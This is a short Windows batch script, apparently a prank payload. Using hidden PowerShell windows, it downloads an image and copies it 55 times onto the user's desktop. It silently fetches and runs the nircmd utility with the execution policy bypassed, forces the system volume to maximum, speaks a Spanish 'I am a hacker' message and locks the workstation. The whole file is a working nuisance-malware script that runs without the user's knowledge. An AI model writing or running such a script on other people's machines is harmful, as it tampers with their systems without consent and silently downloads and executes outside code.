@echo off

powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'https://pbs.twimg.com/media/CG_6R6hXAAEnowm.jpg' -OutFile \"$env:TEMP\pedro.png\""

start "" "https://pbs.twimg.com/media/CG_6R6hXAAEnowm.jpg"

powershell -WindowStyle Hidden -Command "for ($i = 1; $i -le 55; $i++) { Copy-Item -Path \"$env:TEMP\pedro.png\" -Destination \"C:\Users\$env:USERNAME\Desktop\pedro$i.png\" }"

set "NIR=%TEMP%\nircmd.exe"

if not exist "%NIR%" (
    powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command "Invoke-WebRequest 'https://www.nirsoft.net/utils/nircmd.zip' -OutFile \"$env:TEMP\nircmd.zip\"; Add-Type -AssemblyName System.IO.Compression.FileSystem; [IO.Compression.ZipFile]::ExtractToDirectory(\"$env:TEMP\nircmd.zip\", \"$env:TEMP\")"
)

"%NIR%" mutesysvolume 0
"%NIR%" setsysvolume 65535

powershell -WindowStyle Hidden -NoProfile -Command "Add-Type -AssemblyName System.Speech; $speak = New-Object System.Speech.Synthesis.SpeechSynthesizer; $speak.Volume = 100; $speak.Speak('Hola, soy un hacker. Tengo un windows en un mac. KALISE PARA TODOS.');"

rundll32.exe user32.dll,LockWorkStation
